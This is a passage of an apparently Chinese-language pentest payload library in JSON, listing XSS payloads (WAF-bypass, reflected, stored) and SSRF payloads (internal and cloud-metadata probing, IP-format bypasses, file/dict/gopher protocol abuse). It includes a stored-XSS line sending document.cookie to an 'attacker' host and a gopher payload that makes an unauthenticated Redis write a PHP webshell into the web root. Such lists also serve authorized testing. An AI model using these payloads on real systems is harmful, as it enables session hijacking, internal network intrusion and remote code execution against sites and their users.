          "name": "Bypass WAF",
          "entries": [
            {
              "id": "xss-bypass-001",
              "title": "大小写混淆绕过",
              "payload": "\u003cScRiPt\u003ealert(1)\u003c/ScRiPt\u003e\n\u003csCrIpT\u003eprompt(1)\u003c/sCrIpT\u003e"
            },
            {
              "id": "xss-bypass-002",
              "title": "拆分标签/编码绕过",
              "payload": "\u003csvg onload\u003dalert(1)\u003e\n\u003cimg src\u003dx onerror\u003dalert(1)\u003e\n\u003ca href\u003d\"javascript:alert(1)\"\u003eclick\u003c/a\u003e"
            },
            {
              "id": "xss-bypass-003",
              "title": "无括号绕过",
              "payload": "\u003cscript\u003ealert`1`\u003c/script\u003e\n\u003cscript\u003etop[\u0027al\u0027+\u0027ert\u0027](1)\u003c/script\u003e"
            }
          ]
        },
        {
          "id": "95d9dec1-3360-4e55-b1a3-9c0e78ecd3b9",
          "name": "反射XSS",
          "entries": [
            {
              "id": "xss-ref-001",
              "title": "基础script标签",
              "payload": "\u003cscript\u003ealert(1)\u003c/script\u003e\n\u003cscript\u003eprompt(document.domain)\u003c/script\u003e"
            },
            {
              "id": "xss-ref-002",
              "title": "图片事件触发",
              "payload": "\u003cimg src\u003d1 onerror\u003dalert(1)\u003e\n\u003cimg src\u003dx onmouseover\u003dalert(1)\u003e"
            },
            {
              "id": "xss-ref-003",
              "title": "SVG事件触发",
              "payload": "\u003csvg onload\u003dalert(1)\u003e\n\u003csvg onload\u003dprompt(1)\u003e"
            },
            {
              "id": "xss-ref-004",
              "title": "iframe 触发",
              "payload": "\u003ciframe onload\u003dalert(1)\u003e\u003c/iframe\u003e\n\u003ciframe src\u003djavascript:alert(1)\u003e\u003c/iframe\u003e"
            },
            {
              "id": "xss-ref-005",
              "title": "超链接 javascript",
              "payload": "\u003ca href\u003d\"javascript:alert(1)\"\u003eXSS\u003c/a\u003e\n\u003ca href\u003d\"javascript:top.alert(1)\"\u003eXSS\u003c/a\u003e"
            },
            {
              "id": "xss-ref-006",
              "title": "input 自动聚焦",
              "payload": "\u003cinput onfocus\u003dalert(1) autofocus\u003e\n\u003cinput onblur\u003dalert(1)\u003e"
            },
            {
              "id": "xss-ref-007",
              "title": "body 事件",
              "payload": "\u003cbody onload\u003dalert(1)\u003e\n\u003cbody onscroll\u003dalert(1)\u003e"
            }
          ]
        },
        {
          "id": "6a72e2c4-00b8-44d3-b940-e8cc29063f89",
          "name": "存储XSS",
          "entries": [
            {
              "id": "xss-sto-001",
              "title": "标准存储型 payload",
              "payload": "\u003cscript\u003ealert(document.domain)\u003c/script\u003e\n\u003cscript\u003efetch(\u0027http://attacker/\u0027+document.cookie)\u003c/script\u003e"
            },
            {
              "id": "xss-sto-002",
              "title": "图片无交互触发",
              "payload": "\u003cimg src\u003dx onerror\u003dalert(document.domain)\u003e\n\u003cimg src\u003d1 onerror\u003dfetch(\u0027http://x\u0027)\u003e"
            },
            {
              "id": "xss-sto-003",
              "title": "闭合标签类（高危通用）",
              "payload": "\u003c/textarea\u003e\u003cscript\u003ealert(1)\u003c/script\u003e\n\u003c/title\u003e\u003cscript\u003ealert(1)\u003c/script\u003e\n\u003c/style\u003e\u003cimg src\u003dx onerror\u003dalert(1)\u003e\n\u003c/video\u003e\u003csvg onload\u003dalert(1)\u003e\n\u003c/div\u003e\u003cscript\u003ealert(1)\u003c/script\u003e"
            },
            {
              "id": "xss-sto-004",
              "title": "冷门标签：video / audio",
              "payload": "\u003c/video\u003e\u003cscript\u003ealert(1)\u003c/script\u003e\n\u003cvideo onerror\u003dalert(1)\u003e\n\u003caudio onerror\u003dalert(1) src\u003dx\u003e"
            },
            {
              "id": "xss-sto-005",
              "title": "冷门标签：svg / math",
              "payload": "\u003csvg onload\u003dalert(1)\u003e\n\u003cmath\u003e\u003cmtext\u003e\u003cscript\u003ealert(1)\u003c/script\u003e\u003c/mtext\u003e\u003c/math\u003e"
            },
            {
              "id": "xss-sto-006",
              "title": "冷门标签：details / marquee",
              "payload": "\u003cdetails open ontoggle\u003dalert(1)\u003e\n\u003cmarquee onscroll\u003dalert(1)\u003e"
            },
            {
              "id": "xss-sto-007",
              "title": "富文本/评论区专用",
              "payload": "\u003cdiv onmouseover\u003dalert(1)\u003etest\u003c/div\u003e\n\u003cspan onclick\u003dalert(1)\u003eclick\u003c/span\u003e"
            },
            {
              "id": "xss-sto-008",
              "title": "超长闭合逃逸（通用杀招）",
              "payload": "\"\u003e\u003c/div\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\u003c/iframe\u003e\u003c/noscript\u003e\u003c/style\u003e\u003c/title\u003e\u003c/textarea\u003e\u003c/video\u003e\u003cscript\u003ealert(1)\u003c/script\u003e"
            }
          ]
        }
      ]
    },
    {
      "id": "cat_ssrf",
      "name": "SSRF",
      "expanded": true,
      "subCategories": [
        {
          "id": "ssrf-basic",
          "name": "基础探测",
          "entries": [
            {
              "id": "ssrf-basic-01",
              "title": "本地探测",
              "payload": "http://localhost\nhttp://127.0.0.1\nhttp://0.0.0.0"
            },
            {
              "id": "ssrf-basic-02",
              "title": "内网网段探测",
              "payload": "http://192.168.0.1\nhttp://10.0.0.1\nhttp://172.16.0.1\nhttp://169.254.169.254\nhttp://metadata.tencentyun.com\nhttp://metadata.aliyun.com"
            },
            {
              "id": "ssrf-basic-03",
              "title": "常见端口探测",
              "payload": "http://127.0.0.1:80\nhttp://127.0.0.1:443\nhttp://127.0.0.1:8080\nhttp://127.0.0.1:7001\nhttp://127.0.0.1:3306\nhttp://127.0.0.1:6379\nhttp://127.0.0.1:8888"
            }
          ]
        },
        {
          "id": "ssrf-bypass",
          "name": "SSRF 绕过方式",
          "entries": [
            {
              "id": "ssrf-bypass-01",
              "title": "IP 各种格式绕过",
              "payload": "http://0\nhttp://127.0.0.1\nhttp://127.0.0.0\nhttp://127.1\nhttp://0x7f.0.0.1\nhttp://2130706433"
            },
            {
              "id": "ssrf-bypass-02",
              "title": "特殊域名绕过",
              "payload": "http://localhost@127.0.0.1\nhttp://a.com@127.0.0.1\nhttp://xip.io\nhttp://nip.io"
            },
            {
              "id": "ssrf-bypass-03",
              "title": "协议/符号绕过",
              "payload": "file://\n\\\\\ngopher://\ndict://\nftp://"
            },
            {
              "id": "ssrf-bypass-04",
              "title": "302 跳转绕过",
              "payload": "http://your-redirect-url/redirect?url\u003d127.0.0.1"
            }
          ]
        },
        {
          "id": "ssrf-protocol",
          "name": "协议利用",
          "entries": [
            {
              "id": "ssrf-pro-01",
              "title": "file 协议读取文件",
              "payload": "file:///etc/passwd\nfile:///C:/Windows/System32/drivers/etc/hosts\nfile:///proc/self/environ\nfile:///proc/cmdline"
            },
            {
              "id": "ssrf-pro-02",
              "title": "dict 协议探测端口",
              "payload": "dict://127.0.0.1:6379/info\ndict://127.0.0.1:3306/info"
            },
            {
              "id": "ssrf-pro-03",
              "title": "ftp 协议探测",
              "payload": "ftp://127.0.0.1:21\nftp://test:test@127.0.0.1:21"
            },
            {
              "id": "ssrf-pro-04",
              "title": "gopher 协议（高危）",
              "payload": "gopher://127.0.0.1:6379/_\ngopher://127.0.0.1:3306/_\ngopher://127.0.0.1:80/_"
            }
          ]
        },
        {
          "id": "ssrf-attack",
          "name": "内网攻击",
          "entries": [
            {
              "id": "ssrf-attack-01",
              "title": "Redis 未授权",
              "payload": "gopher://127.0.0.1:6379/_config%20set%20dir%20/var/www/html\nconfig%20set%20dbfilename%20shell.php\nset%20shell%20%3C%3Fphp%20eval($_POST[1])%3B%3F%3E\nsave"
            },
            {
              "id": "ssrf-attack-02",
              "title": "MySQL 攻击",
              "payload": "gopher://127.0.0.1:3306/_\nhttp://127.0.0.1:3306"
            },
            {
              "id": "ssrf-attack-03",
              "title": "FastCGI RCE",
              "payload": "gopher://127.0.0.1:9000/_"
            },
            {
              "id": "ssrf-attack-04",
